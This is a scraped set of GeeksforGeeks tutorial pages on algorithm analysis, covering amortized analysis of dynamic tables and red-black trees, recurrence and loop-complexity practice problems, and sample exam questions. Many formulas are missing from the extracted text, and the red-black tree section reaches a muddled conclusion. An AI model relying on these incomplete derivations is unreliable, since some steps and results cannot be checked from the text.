but space required becomes high. The solution to this trade-off problem is to use Dynamic Table (or Arrays). The idea is to increase size of table whenever it becomes full. Following are the steps to follow when table becomes full. 1) Allocate memory for a larger table of size, typically twice the old table. 2) Copy the contents of old table to new table. 3) Free the old table. If the table has space available, we simply insert new item in available space. What is the time complexity of n insertions using the above scheme? If we use simple analysis, the worst case cost of an insertion is O(n). Therefore, worst case cost of n inserts is n * O(n) which is O(n2). This analysis gives an upper bound, but not a tight upper bound for n insertions as all insertions don’t take Θ(n) time. So using Amortized Analysis, we could prove that the Dynamic Table scheme has O(1) insertion time which is a great result used in hashing. Also, the concept of dynamic table is used in vectors in C++, ArrayList in Java. Following are few important notes. 1) Amortized cost of a sequence of operations can be seen as expenses of a salaried person. The average monthly expense of the person is less than or equal to the salary, but the person can spend more money in a particular month by buying a car or something. In other months, he or she saves money for the expensive month. 2) The above Amortized Analysis done for Dynamic Array example is called Aggregate Method. There are two more powerful ways to do Amortized analysis called Accounting Method and Potential Method. We will be discussing the other two methods in separate posts. 3) The amortized analysis doesn’t involve probability. There is also another different notion of average-case running time where algorithms use randomization to make them faster and expected running time is faster than the worst-case running time. These algorithms are analyzed using Randomized Analysis. Examples of these algorithms are Randomized Quick Sort, Quick Select and Hashing. We will soon be covering Randomized analysis in a different post. Amortized analysis of insertion in Red-Black Tree Let us discuss the Amortized Analysis of Red-Black Tree operations (Insertion) using Potential Method. To perform the amortized analysis of Red-Black Tree Insertion operation, we use Potential(or Physicist’s) method. For potential method, we define a potential function that maps a data structure to a non-negative real value. An operation can result in a change of this potential. Let us define the potential function in the following manner: (1) where n is a node of Red-Black Tree Potential function = ,over all nodes of the red black tree. Further, we define the amortized time of an operation as: Amortized time= c + (h) (h)= (h’) – (h) where h and h’ are the states of Red-Black Tree before and after the operation respectively c is the actual cost of the operation The change in potential should be positive for low-cost operations and negative for high-cost operations. A new node is inserted on a leaf of a red-black tree. We have the leaves of a red-black tree of any one of the following types: The insertions and their amortized analysis can be represented as: (1) This insertion is performed by first recolouring the parent and the other sibling(red). Then the grandparent and uncle of that leaf node is considered for further recolouring which leads to the amortized cost to be -1(when grandparent of the leaf node is red), -2 (when uncle of the leaf is black and grandparent is black) or +1 (when uncle of the leaf is red and grandparent is black). The insertion can be shown as: (2) In this insertion, the node is inserted without any changes as the black depth of the leaves remain the same. This is the case when leaf may have a black sibling or do not have any sibling (since we consider the colour of the colour of null node to be black). So, the amortized cost of this insertion is 0. (3) In this insertion, we cannot recolour the leaf node, its parent and the sibling such that the black depth stays the same as before. So, we need to perform a Left- Left rotation. After rotation, there are no changes when the grandparent of g(the inserted node) is black. Also, for the case of Red Grandparent of g(the inserted node), we do not have any changes. So, the insertion is completed with amortized cost= +2. The insertion has been depicted below: After calculating these particular amortized costs at the leaf site of a red-black tree we can discuss the nature of total amortized cost of insertion in a red-black tree. Since this may happen that two red nodes may have a parent-child relationship till the root of the red-black tree. So in extreme(or corner) case, we reduce the number of black nodes with two red children by 1 and we at most increase the number of black nodes with no red children by 1, leaving a net loss of at most 1 to the potential function. Since one unit of potential pays for each operation therefore (h) n where n is total number of nodes Thus, the total amortized cost of insertion in Red-Black Tree is O(n). For any doubts regarding insertions in red black tree, you may refer Insertions in Red-Black Tree. Sources: Berkeley Lecture 35: Amortized Analysis MIT Lecture 13: Amortized Algorithms, Table Doubling, Potential Method http://www.cs.cornell.edu/courses/cs3110/2011sp/lectures/lec20-amortized/amortized.htm http://web.iitd.ac.in/~csz188551/COL106_2019/ Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Amortized analysis for increment in counterAnalysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithms | Big-O analysisAnalysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithms | Set 5 (Practice Problems)Algorithms Sample Questions | Set 3 | Time Order AnalysisAnalysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Asymptotic Analysis and comparison of sorting algorithmsAnalysis of algorithms | little o and little omega notationsPractice Questions on Time Complexity AnalysisAnalysis of different sorting techniquesTime Complexity Analysis | Tower Of Hanoi (Recursion)Complexity Analysis of Binary SearchDifference between Posteriori and Priori analysisComplexity analysis of various operations of Binary Min HeapExamples of Big-O analysisAlgorithm Practice Question for Beginners | Set 1NP-Completeness | Set 1 (Introduction)Improved By : ashwinikumar43215 Article Tags : Analysis thumb_up 37 To-do Done 2.6 Based on 119 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Tail Recursion Next last_page Algorithm Practice Question for Beginners | Set 1 Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Difference between NP hard and NP complete problemComplexity Analysis of Binary SearchPractice Questions on Time Complexity AnalysisTime complexity of recursive Fibonacci program More related articles in Analysis Analysis of different sorting techniquesCyclomatic ComplexityProof that traveling salesman problem is NP HardAnalysis of Algorithms | Set 5 (Practice Problems)Analysis of Algorithms | Big-O analysis room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Analysis of Algorithms | Set 5 (Practice Problems) - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Practice Questions on Time Complexity AnalysisAnalysis of Algorithms | Set 5 (Practice Problems)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does ‘Space Complexity’ mean?Pseudo-polynomial AlgorithmsNP-Completeness | Set 1 (Introduction)A Time Complexity QuestionMerge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortAnalysis of Algorithms | Set 1 (Asymptotic Analysis) Analysis of Algorithms | Set 5 (Practice Problems) Last Updated: 26-09-2020 We have discussed Asymptotic Analysis, Worst, Average and Best Cases , Asymptotic Notations and Analysis of loops in previous posts.In this post, practice problems on the analysis of algorithms are discussed.Problem 1: Find the complexity of below recurrence: { 3T(n-1), if n>0, T(n) = { 1, otherwise Solution: Let us solve using substitution. T(n) = 3T(n-1) = 3(3T(n-2)) = 32T(n-2) = 33T(n-3) ... ... = 3nT(n-n) = 3nT(0) = 3n This clearly shows that the complexity of this function is O(3n). Problem 2: Find the complexity of the recurrence: { 2T(n-1) - 1, if n>0, T(n) = { 1, otherwise Solution: Let us try solving this function with substitution. T(n) = 2T(n-1) - 1 = 2(2T(n-2)-1)-1 = 22(T(n-2)) - 2 - 1 = 22(2T(n-3)-1) - 2 - 1 = 23T(n-3) - 22 - 21 - 20 ..... ..... = 2nT(n-n) - 2n-1 - 2n-2 - 2n-3 ..... 22 - 21 - 20 = 2n - 2n-1 - 2n-2 - 2n-3 ..... 22 - 21 - 20 = 2n - (2n-1) [Note: 2n-1 + 2n-2 + ...... + 20 = 2n - 1] T(n) = 1 Time Complexity is O(1). Note that while the recurrence relation looks exponential the solution to the recurrence relation here gives a different result. Problem 3: Find the complexity of the below program: CPP filter_none edit close play_arrow link brightness_4 code function(int n) { if (n==1) return; for (int i=1; i<=n; i++) { for (int j=1; j<=n; j++) { printf("*"); break; } } } chevron_right filter_none Solution: Consider the comments in the following function. CPP filter_none edit close play_arrow link brightness_4 code function(int n) { if (n==1) return; for (int i=1; i<=n; i++) { // Inner loop executes only one // time due to break statement. for (int j=1; j<=n; j++) { printf("*"); break; } } } chevron_right filter_none Time Complexity of the above function O(n). Even though the inner loop is bounded by n, but due to the break statement, it is executing only once. Problem 4: Find the complexity of the below program: CPP filter_none edit close play_arrow link brightness_4 code void function(int n) { int count = 0; for (int i=n/2; i<=n; i++) for (int j=1; j<=n; j = 2 * j) for (int k=1; k<=n; k = k * 2) count++; } chevron_right filter_none Solution: Consider the comments in the following function. CPP filter_none edit close play_arrow link brightness_4 code void function(int n) { int count = 0; for (int i=n/2; i<=n; i++) // Executes O(Log n) times for (int j=1; j<=n; j = 2 * j) // Executes O(Log n) times for (int k=1; k<=n; k = k * 2) count++; } chevron_right filter_none Time Complexity of the above function O(n log2n). Problem 5: Find the complexity of the below program: CPP filter_none edit close play_arrow link brightness_4 code void function(int n) { int count = 0; for (int i=n/2; i<=n; i++) for (int j=1; j+n/2<=n; j = j++) for (int k=1; k<=n; k = k * 2) count++; } chevron_right filter_none Solution: Consider the comments in the following function. CPP filter_none edit close play_arrow link brightness_4 code void function(int n) { int count = 0; // outer loop executes n/2 times for (int i=n/2; i<=n; i++) // middle loop executes n/2 times for (int j=1; j+n/2<=n; j = j++) // inner loop executes logn times for (int k=1; k<=n; k = k * 2) count++; } chevron_right filter_none Time Complexity of the above function O(n2logn). Problem 6: Find the complexity of the below program: CPP filter_none edit close play_arrow link brightness_4 code void function(int n) { int i = 1, s =1; while (s <= n) { i++; s += i; printf("*"); } } chevron_right filter_none Solution: We can define the terms ‘s’ according to relation si = si-1 + i. The value of ‘i’ increases by one for each iteration. The value contained in ‘s’ at the ith iteration is the sum of the first ‘i’ positive integers. If k is total number of iterations taken by the program, then while loop terminates if: 1 + 2 + 3 ….+ k = [k(k+1)/2] > n So k = O(√n).Time Complexity of the above function O(√n). Problem 7: Find a tight upper bound on the complexity of the below program: CPP filter_none edit close play_arrow link brightness_4 code void function(int n) { int count = 0; for (int i=0; i<n; i++) for (int j=i; j< i*i; j++) if (j%i == 0) { for (int k=0; k<j; k++) printf("*"); } } chevron_right filter_none Solution: Consider the comments in the following function. CPP filter_none edit close play_arrow link brightness_4 code void function(int n) { int count = 0; // executes n times for (int i=0; i<n; i++) // executes O(n*n) times. for (int j=i; j< i*i; j++) if (j%i == 0) { // executes j times = O(n*n) times for (int k=0; k<j; k++) printf("*"); } } chevron_right filter_none Time Complexity of the above function O(n5). This article is contributed by Mr. Somesh Awasthi. If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithms | Big-O analysisAnalysis of Algorithm | Set 5 (Amortized Analysis Introduction)Practice Questions on Time Complexity AnalysisAlgorithms Sample Questions | Set 3 | Time Order AnalysisAnalysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Asymptotic Analysis and comparison of sorting algorithmsAnalysis of algorithms | little o and little omega notationsAlgorithm Practice Question for Beginners | Set 1Practice Set for Recurrence RelationsAnalysis of Algorithm | Set 4 (Solving Recurrences)Analysis of different sorting techniquesTime Complexity Analysis | Tower Of Hanoi (Recursion)Amortized analysis for increment in counterComplexity Analysis of Binary SearchDifference between Posteriori and Priori analysisComplexity analysis of various operations of Binary Min HeapExamples of Big-O analysisImproved By : sugyan Article Tags : Analysis thumb_up 29 To-do Done 3.1 Based on 23 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Auxiliary Space with Recursive Functions Next last_page Master Theorem For Subtract and Conquer Recurrences Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Complexity of different operations in Binary tree, Binary Search Tree and AVL treeProof that Clique Decision problem is NP-Complete | Set 2Difference between NP hard and NP complete problemUnderstanding Time Complexity with Simple ExamplesComplexity Analysis of Binary Search More related articles in Analysis Cyclomatic ComplexityAnalysis of different sorting techniquesProof that SAT is NP CompleteTime complexity of recursive Fibonacci programAnalysis of Algorithms | Big-O analysis room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Algorithms Sample Questions | Set 3 | Time Order Analysis - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ RecursionA* Search AlgorithmDifference between BFS and DFSHow to write a Pseudo Code?Data Structures and Algorithms Online Courses : Free and PaidRecursive Practice Problems with SolutionsPlayfair Cipher with ExamplesConverting Roman Numerals to Decimal lying between 1 to 3999Commonly Asked Algorithm Interview Questions | Set 1Quick Sort vs Merge SortComplexity Analysis of Binary SearchMid-Point Circle Drawing AlgorithmComparison among Bubble Sort, Selection Sort and Insertion SortGenerate all permutation of a set in PythonDDA Line generation Algorithm in Computer GraphicsDesign a Chess GameBresenham’s Line Generation AlgorithmHow can one become good at Data structures and Algorithms easily?K means Clustering - IntroductionLower and Upper Bound TheoryThe Two Water Jug PuzzleLine Clipping | Set 1 (Cohen–Sutherland Algorithm)Columnar Transposition CipherMust do Math for Competitive ProgrammingArray of Vectors in C++ STLCyclomatic ComplexityK-Nearest NeighboursPriority CPU Scheduling with different arrival time - Set 2MO's Algorithm (Query Square Root Decomposition) | Set 1 (Introduction)Rail Fence Cipher - Encryption and Decryption Algorithms Sample Questions | Set 3 | Time Order Analysis Last Updated: 28-05-2019 Question 1: What is the asymptotic boundary of T(n)? θ( n*log(n) ) θ( n2 ) θ( n ) θ( n*log2(n) ) θ( n2*log2(n) ) Answer: 3 Explanation: To find appropriate upper and lower boundaries, an approach which first comes to mind is to expand the sigma notation to single terms among which some patterns can be detected. This way it helps to define some acceptable upper and lower boundaries and their combination might lead to a possible solution. Regarding specifying these boundaries, there are some hints as following: This is obvious that for any k greater than √ n, each logkn should be less than log√nn = 2, while more than lognn = 1. In mathematic language: A hint on UPPER boundary, for k > √ n: A hint on LOWER boundary, for k > √ n: Besides that, as the base of a logarithm increases, its value decreases; so none of the terms resulted from expansion of the first sigma can be more than the first ter, log2n, nor can be less than the last one, which is log√nn; in other sentences, Another hint on UPPER boundary, but this time for k < √ n: Another hint on LOWER boundary, but this time for k < √ n: Following these hints gives: Lower boundary: Upper boundary: What has been derived till now indicates that the growth of T(n) cannot exceed O(n), nor can be less than Ω(n); Therefore, the asymptotic complexity order of T(n) is: Question 2: What is running time order of given program? C PROGRAM: Input n of type integer for(i= 2; i<n; i=i+1) for(j = 1; j < n; j= j * i) // A line of code of Θ(1) θ( n ) θ( n*log(n) ) θ( n2 ) θ( n*log2log(n) ) θ( n2*log2(n) ) Answer: 1 Explanation: The running time of each line is indicated below separately: The first code line, t1(n), is: for(i= 2; i<n; i=i+1) // it runs (n – 2) times; so the time complexity of this line is of θ(n) The second code line, t2(n) is: for(j = 1; j < n; j= j * i) // log2n + log3n + … + logn-1n = Σlogin ∈ Θ( n ) in according to PREVIOUS QUESTION of this article (Refer to Question 1) The third code line, t3(n) is: //A code line of Θ(1) :: Inside loops, so its order time is as the same as that of previous line, which is of Θ( n ) The total time complexity T(n) of the program is the sum of each line ti(n), i = 1..3, as following: Question 3: The following recurrence equation T(n) is given. How many number of proposed gi(n), i=1 .. 5, functions is acceptable in order to have T(n) ∈ θ(f(n)) when f(n) = gi(n)? 1 2 3 4 5 Answer: 2 Explanation: Master theorem and its extension can be of great help to easily tackle this problem. The general form of master theorem can be expressed as: In order to use the master theorem, there is a need to see that the given problem with specific “a”, “b”, and “f(n)” satisfies the condition of which case of this theorem. The three cases of master theorem and their conditions are: case 1: This case happens the recursion tree is leaf-heavy (the work to split/recombine a problem is dwarfed by subproblems.) case 2: This case occurs when the work to split/recombine a problem is comparable to subproblems. case 3: This case takes place when the recursion tree is root-heavy (the work to split/recombine a problem dominates subproblems.) The generalized second case of master theorem, so-called advanced master theorem, handles all values of k. It says: The answer to this question is the third case of master theorem where T(n) is of Θ( f(n) ); so in order to have T(n) = θ(f(n)), there should be polynomial difference “epsilon” between nlogba and f(n); therefore, the functions g1(n) and g2(n) meet the conditions of third case of Master theorem. The value of “epsilon” found for them are 1 and 0.01 respectively. Question 4: Which option delineates a true asymptotic analysis for this multiple input variable program, while having an insight (prior knowledge) about the relative growth of inputs, like m ∈ Θ(n)? C PROGRAM: inputs m and n of type integer for(i= 1; i<= n; i=i+1) : n for(j = 1; j <= m; j= j * 2) for(k = 1; k <= j; k= k+1) \\ A code line of Θ(1) θ( n * m*(m+1)/2 ) θ( n*m + n*log2(m) ) θ( m3 ) θ( n2 ) θ( n2*log2(n) ) Answer: 4 Explanation: To compute the time complexity of program based on inputs n and m, T(n, m), the first step is to obtain the running time of each line, ti(n, m), as indicated below: for(i= 1; i<= n; i=i+1) // It runs n times for(j = 1; j <= m; j= j * 2) // iterates log2(m) times, and it is inside another loop which multiply it n times for(k = 1; k <= j; k= k+1) // It runs 2 + 4 + 8 + … + 2log(m) times This is also inside an outer loop, first “for” loop, which itself iterates n times \\A line of code of Θ(1) The same as previous line, Θ( m*n ) The total running time order of this program is: It can even be more simplified in according to the given prior knowledge which says that m ∈ Θ(n), or n ∈ Θ(m): Question 5: There is a vector of integer numbers, called V[], which is of length “N”. For a specific problem (program), it is given that Σi=1N |V[i]| = P. What is the time complexity of following code snippet? [Needless to say, P is also an integer number] Tmp = -1; For r= 1 to N For S = 1 to V[r] Tmp = Tmp + 20; O( N + 2*N*P ) O( N * P ) O( N2 ) O( P2 ) O( 2*P + N ) Answer: 5 Explanation: The number of time each line will be executed and their total time complexity is indicated below: Tmp = -1; // θ(1) For r= 1 to N // N times; so it is of θ(N) For S = 1 to V[r] // Cannot be more than |V[r]| times; so the total number of times is O(Σr=1N |V[r]| ) = O(P) Tmp = Tmp + 20; // The same as previous line, O( P ) In order to find the time complexity of the given program, there are three facts to keep on mind: Each V[r] can take any integer value (even zero or negative ones), but it doesn’t matter as all negative values will lead to no execution of the second loop in programming languages like C. However, in programming languages, it is allowed to count down-to (or to iterate over) negative numbers, but the algorithms are not being analyzed depends on programming languages, and the analysis is just based on the algorithm itself. What to say for sure is the information that is given in the question; so a shrewd action is to consider the absolute value of |V[r]| and also to use O() notation in order to get rid of being stuck. Otherwise, it has to be said that the program runs at least as much as the time needed for just execution of the first loop, or Ω(N) Although the running time order of this program does not seem to depend on two variables, but there is no more information for further analysis which is needed to compare P and N; so the asymptotic complexity depends on the values of both P and N; in other words, there is T(N, P) complexity function instead of T(N). The O() notation defines a looser boundary than the tight boundary specified by &theta() notation; Therefore, the sum of θ() and O() would be of O() type. In this problem, the total time complexity of the program, which is the sum of all code lines complexities, θ(1) + θ(N) + O( P ) + O( P ), belongs to set O( 2 * P + N + 1 ) or O(2*P + N). Considering all factors mentioned above, one asymptotic complexity can be of T(N, P) ∈ O(2*|P| + N); However, the coefficients of variables are not important at the final step of asymptotic analysis, as they all belong to the same set of complexity functions, and the complexity can also be expressed as O(|P| + N). Source: A compilation of Iran university exams (with a bit of summarization, modification, and also translation) Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithms | Set 1 (Asymptotic Analysis)Algorithms Sample Questions | Recurrences | Set 2Analysis of Algorithms | Big-O analysisPractice Questions on Time Complexity AnalysisAnalysis of Algorithm | Set 5 (Amortized Analysis Introduction)Analysis of Algorithms | Set 5 (Practice Problems)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Time Complexity Analysis | Tower Of Hanoi (Recursion)Asymptotic Analysis and comparison of sorting algorithmsAnalysis of algorithms | little o and little omega notationsAnalysis of Algorithm | Set 4 (Solving Recurrences)Flatten Binary Tree in order of Level Order TraversalPrint nodes of a Binary Search Tree in Top Level Order and Reversed Bottom Level Order alternatelyMinimum time required to complete exactly K tasks based on given order of task executionMaximum removal from array when removal time >= waiting timeAnalysis of different sorting techniquesAmortized analysis for increment in counterComplexity Analysis of Binary Searchj*g*1991Check out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : AlgorithmsAnalysisRecursiontime complexity Practice Tags : RecursionAlgorithms thumb_up 2 To-do Done 4.5 Based on 2 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Find the original coordinates whose Manhattan distances are given Next last_page Find maximum topics to prepare in order to pass the exam Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Algorithms Difference between NP hard and NP complete problemQuadratic Probing in HashingDifference Between Symmetric and Asymmetric Key EncryptionTop 50 Array Coding Problems for InterviewsBlowfish Algorithm with Examples Most visited in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Complexity of different operations in Binary tree, Binary Search Tree and AVL treeAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Difference between NP hard and NP complete problemAnalysis of Algorithms | Set 3 (Asymptotic Notations) room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Analysis of Algorithms | Set 2 (Worst, Average and Best Cases) - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does ‘Space Complexity’ mean?Pseudo-polynomial AlgorithmsNP-Completeness | Set 1 (Introduction)A Time Complexity QuestionMerge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortProgram for Fibonacci numbersProgram for nth Catalan NumberBell Numbers (Number of ways to Partition a Set)Analysis of Algorithms | Set 1 (Asymptotic Analysis) Analysis of Algorithms | Set 2 (Worst, Average and Best Cases) Last Updated: 09-11-2020 In the previous post, we discussed how Asymptotic analysis overcomes the problems of naive way of analyzing algorithms. In this post, we will take an example of Linear Search and analyze it using Asymptotic analysis.We can have three cases to analyze an algorithm: 1) The Worst Case 2) Average Case 3) Best CaseLet us consider the following implementation of Linear Search. C++ filter_none edit close play_arrow link brightness_4 code // C++ implementation of the approach #include <bits/stdc++.h> using namespace std; // Linearly search x in arr[]. // If x is present then return the index, // otherwise return -1 int search(int arr[], int n, int x) { int i; for (i = 0; i < n; i++) { if (arr[i] == x) return i; } return -1; } // Driver Code int main() { int arr[] = { 1, 10, 30, 15 }; int x = 30; int n = sizeof(arr) / 